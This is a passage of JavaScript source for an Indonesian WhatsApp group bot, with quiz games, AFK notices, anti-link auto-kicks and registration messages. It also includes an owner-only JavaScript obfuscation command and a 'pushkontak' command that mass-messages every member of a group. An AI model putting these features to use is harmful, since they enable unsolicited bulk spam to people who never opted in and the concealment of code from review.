        let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
        // Const Tambahan Sc Gw
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./zr.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
        const totalFitur = () => {
            var mytext = fs.readFileSync("./zr.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        const sendvn = (teks) => {
            conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        }


        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = conn.sendMessage(m.chat, { audio: fs.readFileSync(`./database/AUDIO/${anju}.mp3`), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
            }
        }
        

  let caption = ''
  let changelogs = global.db.data.changelog || []
  let pacar = global.db.data.pacar || []
  let sahabat = global.db.data.sahabat || []
  
        // Function Created By ${global.wm}
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}

function generateRandomPassword() {
    return Array(10).fill(null).map(() => (Math.random() * 16 | 0).toString(16)).join('');
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `ZkyOfc`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


  

arrbulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jummat', 'Sabtu'];
let date = new Date();
let millisecond = date.getMilliseconds();
let hari = date.getDay();
let tanggal = date.getDate();
var thisDay = date.getDay(),
thisDay = myDays[thisDay];
let bulan = date.getMonth();
let tahun = date.getFullYear();
async function loading() {

var react = ["🕐", "🕑", "🕒", "🕓", "🕔", "🕜", "🕖", "🕗", "🕘", "🕙", "🕚", "🕛"];


await conn.sendMessage(m.chat, {
  react: {
    text: react[0],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[1],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[2],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[3],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[4],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[5],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[6],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[7],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[8],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[9],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[10],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: react[11],
    key: m.key
  }
})
await conn.sendMessage(m.chat, {
  react: {
    text: '🍟',
    key: m.key
  }
})
}


const kalgans = { 
key: {
fromMe: [], 
participant: "6283188229366@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}


const newReply = (teks) => {
conn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `arybotz Multi Device`, "previewType": "PHOTO","thumbnail": logo }}}, { quoted: m })}

const reply = (teks) => {
conn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `arybotz Multi Device`, "previewType": "PHOTO","thumbnail": logo }}}, { quoted: m })}

const reply2 = (teks) => {
conn.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/239f2e168a98eac84b390.mp4"},
      gifPlayback: true,
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: '      Simple Bot WhatsApp Made By aryDev      ',
      body: '',
      thumbnailUrl: `${global.thurl}`,
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})}

const reply3 = (teks) => {
conn.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: namabot,
        body: wm,
        sourceUrl: sig,
        thumbnailUrl: "https://telegra.ph/file/68b486d8d932679ffafd9.jpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }}}, { quoted: m})}

const replyZ = async(result,member = []) =>{ 
let translate = require('@vitalets/google-translate-api');
  
if (language == "id"){
  
if (!sender.startsWith("62")){
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: language,})
var teks = toks.text
} 

let contextInfo = {
forwardingScore: 999, 
isForwarded: false, 
mentionedJid: member,
externalAdReply:{
showAdAttribution: true, 
title: `Arybotz MD`,
previewType:"PHOTO",
thumbnailUrl: thumburl,
sourceUrl:`${lanabotz}`
}
}
if(replyType === "web"){
conn.sendMessage(from, { contextInfo,mentions: member, text: teks }, { quoted: m })
} else if(replyType === "web2"){
conn.sendMessageV2(from, {contextInfo,mentions: member,text: teks},{quoted: m })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: m });
} else if(replyType === "quoted"){
conn.sendMessage(from,{ mentions: member,text: teks}, { quoted: setQuoted });
} else {
conn.sendMessage(from, {text: "Gagal Mendapatkan Respon."})
}
}
      
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antilinkv2' in chats)) chats.antilinkv2 = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antilinkyt: false,
                antilinktt: false,
                antilinkv2: false,
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
                if (!('gconly' in setting)) setting.gconly = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                gconly: false,
                autoread: false
            }

        } catch (err) {
            console.error(err)
        }
        // Public & Self
        if (!conn.public) {
            if (!m.key.fromMe && !isPremium && !isCreator) return
        }

        if (m.message) {
            if (global.db.data.settings[botNumber].autoread) {
            conn.readMessages([m.key])
            }
        }
        
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	    if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await conn.updateProfileStatus(`ArybotzDev | Runtime ${uptime} | Version ${version}`).catch(_ => _)
		setting.status = new Date() * 1
	    }
	    }
	    
	    for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
newReply(`Jangan Tag Dia!!
Dia Sedang AFK ${reason ? 'Dengan Alasan: ' + reason : 'Tanpa Alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
newReply(`
Kamu berhenti AFK ${user.afkReason ? ' Setelah: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

	

	
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
}
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: conn.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        conn.ev.emit('messages.upsert', msg)
        }

//                       GAME                    \\        
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`*Jawaban Kamu Benar*\n\n🎁 Bonus Balance $3000`)
                delete tebakgambar[m.sender.split('@')[0]]
                addMonay(m.sender, 3000)
            } else m.reply('*Jawaban Salah!*')
        }
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await reply(`Jawaban Kamu Benar*\n\n🎁 Bonus Balance $3000`)
addMonay(m.sender, 3000)
delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (('family100' + m.sender.split('@')[0] in _family100) && isCmd) {
            let room = _family100['family100' + m.sender.split('@')[0]]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            conn.sendText(m.chat, caption, fkontak, {
                contextInfo: {
                    mentionedJid: parseMention(caption)
                }
            }).then(mes => {
                return _family100['family100' + m.sender.split('@')[0]].pesan = mesg
            }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100' + m.sender.split('@')[0]]
        }
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
            reply(`Jawaban Benar 🤯`)
                await m.reply('*Anda Telah menyerah*')
                delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                delete tebakasahotak[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
            reply(`Jawaban Benar 🤯`)
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksusunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
            reply(`Jawaban Benar 🤯`)
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
            reply(`Jawaban Benar 🤯`)
                delete tebakbendera[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
            reply(`Jawaban Benar 🤯`)
                delete tebakbendera2[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksusunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebakkimia[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktekateki[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaktekateki[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebaktekateki[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaklagu[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete kuismath[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
            deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete caklontong[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
            reply(`Jawaban Benar 🤯`)
                delete caklontong[m.sender.split('@')[0]]
                delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebakkalimat[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaklirik[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await m.reply('*Anda Telah menyerah*')
                delete tebaktebakan[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
reply(`Jawaban Benar 🤯`)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }  


        //Anti Link WA
        if (db.data.chats[m.chat].antilink) {
        
            if (budy.match(`chat.whatsapp.com`)) {
            if (isCreator) return console.log(`Bebas Kirim Link Detected`)
                                if (isAdmins) return console.log(`Bebas Kirim Link Detected`)
                newReply(`Kamu Mengirim Link Group!, Di Grup Ini Terdapat AntilinkGroupWa, Maaf Kamu Akan Saya Kick 👋`)
                if (!isBotAdmins) return newReply(`Gak Jadi`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                conn.sendMessage(m.chat, { delete: m.key })
                await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        if (db.data.chats[m.chat].antilinkv2) {

            if (budy.match(`chat.whatsapp.com`)) {
            if (isCreator) return console.log(`Bebas Kirim Link Detected`)
                                if (isAdmins) return console.log(`Bebas Kirim Link Detected`)
                newReply(`Kamu Mengirim Link Group!, Di Grup Ini Terdapat AntilinkGroupWa, Maaf Kamu Akan Saya Kick 👋`)
                if (!isBotAdmins) return newReply(`Gak Jadi`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata😣`)
                conn.sendMessage(m.chat, { delete: m.key })
            }
        }
        //Anti Link YouTube
        if (db.data.chats[m.chat].antilinkyt) {

            if (budy.match(`https://youtu.be`)) {
            if (isCreator) return console.log(`Bebas Kirim Link Detected`)
                                if (isAdmins) return console.log(`Bebas Kirim Link Detected`)
                newReply(`Kamu Mengirim Link Group!, Di Grup Ini Terdapat AntilinkYoutube, Maaf Kamu Akan Saya Kick 👋`)
                if (!isBotAdmins) return newReply(`Gak Jadi`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link Tiktok

        if (db.data.chats[m.chat].antilinktt) {
        if (isCreator) return console.log(`Bebas Kirim Link Detected`)
                                if (isAdmins) return console.log(`Bebas Kirim Link Detected`)
            if (budy.match(`https://vt.tiktok.com`)) {
                newReply(`Kamu Mengirim Link Group!, Di Grup Ini Terdapat AntilinkTiktok, Maaf Kamu Akan Saya Kick 👋`)
                if (!isBotAdmins) return newReply(`Gak Jadi`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
       
        



if (m.message && isCmd) {

    conn.spam = conn.spam ? conn.spam : {}

    let chat = global.db.data.chats[m.chat]

    if (m.sender in conn.spam) {

        conn.spam[m.sender].count++

        if (m.messageTimestamp - conn.spam[m.sender].lastspam > 2) {

            if (conn.spam[m.sender].count > 2) {

    reply('😉 Jangan Spam!, Beri Jeda Pada Bot')

    }

            conn.spam[m.sender].count = 0

            conn.spam[m.sender].lastspam = m.messageTimestamp

        }

    }

    else

        conn.spam[m.sender] = {

            jid: m.sender,

            count: 0,

            lastspam: 0

        }

     }

    
	
				
        if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
            return
        }

/* ------------ S I M P E L  --------------- */
const react = (emoji, m) => {
let re = conn.sendMessage(m.chat, {
		react: {
			text: emoji,
			key: m,
		}
	})
	return re
	}

const edit = (text, edit) => {
let dit = conn.sendMessage(from, { text : text, edit: edit })
return dit
}

const customsend = (text, mentions, title) => {
let cus = conn.sendMessage(m.chat, {
      text: text,
      contextInfo: {
        mentionedJid: [mentions],
        externalAdReply: {
          title: title,
          thumbnailUrl: ppUrl,
       // thumbnailUrl: pp,
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
    return cus
    }
              
const replycus = (teks, title, trl) => {
conn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": title, "previewType": "PHOTO","thumbnailUrl": trl }}}, { quoted: m })
}
let jsalam = /^(assalam(ualaikum)?|(salamualaiku|(sa(lamu|m)liku|sala))m)$/i.test(m.text)
if (jsalam) {
let jawab = `WaalaikumSalam ❣️`
reply(jawab)
}

let regy = /^(✔️️|y(es)?)$/i.test(m.text.toUpperCase())
if (db.data.users[m.sender].regp === true && regy) {
let userr = db.data.users[m.sender]
userr.regp = false
let sn = crypto.createHash('md5').update(m.sender).digest('hex');const createHash = require("crypto");
let anu = `乂 *R E G I S T E R  S U C C E S S*

╭─「 *D A T A*
│Nama: ${NamaKamu(m.sender)}
│Umur: ${UmurKamu(m.sender)} Tahun
│Ns: ${sn}
╰── ◦`
  conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false, 
        title: `Daftar Berhasil - AryBotz`,
        body: `${global.wm}`,
        thumbnailUrl: "https://telegra.ph/file/61d358e5992f9615cc5af.jpg",
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })              
   
                }

let regnt = /^(✖️|n(o)?)$/i.test(m.text.toUpperCase())
if (db.data.users[m.sender].regp === true && regnt) {
let userr = db.data.users[m.sender]
userr.regp = false
reply(`Proses Register Dibatalkan, Untuk Mengulanginya Lagi Kamu Bisa Ketik *.register <nama>.<umur>*`)
delRegister(m.sender)
}

//MESSAGE CUSTOM
const noregis = `Hai @${m.sender.split('@')[0]} Untuk Melanjutkan Bermain Bot, Tolong Register Terlebih Dulu Penggunan:
  
◦ *Email:* .regmail gmailyou@gmail.com
◦ *Manual:* .register Ary.17`

const youban = `Hai @${m.sender.split('@')[0]} Kamu Tidak Bisa Menggunakan Bot, Karna Kamu Telah Di Banned Oleh Owner`

const gcon = `@${m.sender.split('@')[0]} Penggunaan Private Chat Hanya Untuk Premium User, Untuk Menghindari Spam Yang Berlebihan.!, Masuk ke Group Official Botz Untuk Bermain *.gcbot*`


/* New Line */


        switch (command) {
        
        // Owner Fitur
        case 'public': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                conn.public = true
                newReply('Sukses Ubah Ke Public!!')
        }
        break
        case 'self': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                conn.public = false
                newReply('Sukses Ubah Ke Self!!')
            }
        break
        
        

/*
        case 'addlist':
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return newReply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            newReply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            newReply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break
*/
        case 'enc': {
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            if (!q) return newReply(`Contoh ${prefix+command} const zkysky = require('zkysky-api')`)
            let meg = await obfus(q)
            newReply(`${meg.result}`)
        }
        break
        
        case "pk":
        case 'pushkontak': {
            if (!text) return newReply(`Example ${prefix}${command} Hi Semuanya`)
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = get.length;
            let sentCount = 0;
            newReply('*Wait A Moment.*');
            for (let i = 0; i < get.length; i++) {
              setTimeout(function() {
                conn.sendMessage(get[i], { text: text });
                count--;
                sentCount++;
                if (count === 0) {
                  newReply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * 1000); // delay setiap pengiriman selama 1 detik
            }
            }
            break
        
        case 'addvn':{
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            if (args.length < 1) return newReply('Nama audionya apa')
            if (vnnya.includes(q)) return newReply("Nama tersebut sudah di gunakan")
            let delb = await conn.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./database/AUDIO/${q}.mp3`)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            newReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break
        case 'delvn':{
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            if (args.length < 1) return newReply('Masukan query')
            if (!vnnya.includes(q)) return newReply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./database/AUDIO/${q}.mp3`)
            newReply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
